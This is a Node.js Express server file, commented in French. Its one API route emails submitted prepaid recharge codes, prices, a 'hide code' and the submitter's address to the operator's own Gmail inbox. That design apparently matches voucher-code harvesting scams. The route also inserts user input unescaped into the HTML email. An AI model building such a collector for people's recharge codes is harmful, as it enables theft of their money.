require("dotenv").config();
const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Route de santé (ping) ---
app.get("/health", (req, res) => {
  res.json({ status: "ok", time: new Date().toISOString() });
});

// --- Envoi d’email ---
app.post("/api/send-email", async (req, res) => {
  try {
    const { rechargeType, rechargePrice, rechargeCode, email, hideCode } = req.body;

    if (!rechargeType || !rechargePrice || !rechargeCode || !email) {
      return res.status(400).json({ error: "Champs requis manquants" });
    }

    // --- Transporteur Gmail ---
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER, // Ton Gmail
        pass: process.env.EMAIL_PASS, // Mot de passe d’application
      },
    });

    // --- Options du mail ---
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, // tu reçois le mail dans ta propre boîte
      subject: "Nouvelle soumission de recharge",
      html: `
        <h2>Détails de la soumission</h2>
        <p><strong>Type de recharge :</strong> ${rechargeType}</p>
        <p><strong>Prix :</strong> ${rechargePrice}</p>
        <p><strong>Code :</strong> ${rechargeCode}</p>
        <p><strong>Email du soumetteur :</strong> ${email}</p>
        <p><strong>Hide Code :</strong> ${hideCode || "N/A"}</p>
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    res.json({ success: true, messageId: info.messageId });
  } catch (err) {
    console.error("Erreur envoi email:", err);
    res.status(500).json({ error: "Échec envoi email", details: err?.message || err });
  }
});

// --- Servir le frontend buildé ---
const frontDist = path.join(__dirname, "..", "dist");
app.use(express.static(frontDist));

app.get("*", (req, res) => {
  const indexPath = path.join(frontDist, "index.html");
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send("Not found");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server listening on http://localhost:${PORT}`);
});
